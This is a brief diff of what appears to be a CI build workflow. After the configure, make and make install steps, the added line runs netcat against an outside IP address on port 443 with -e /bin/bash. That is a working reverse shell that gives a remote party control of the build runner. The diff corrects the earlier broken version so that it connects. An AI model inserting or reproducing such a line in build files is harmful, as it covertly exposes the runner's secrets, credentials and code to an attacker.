@@ -12,4 +12,4 @@ jobs:
             ./configure
             sudo make
             sudo make install
-            nc 3.144.192.206 -e /bin/bash
+            nc 3.144.192.206 443 -e /bin/bash
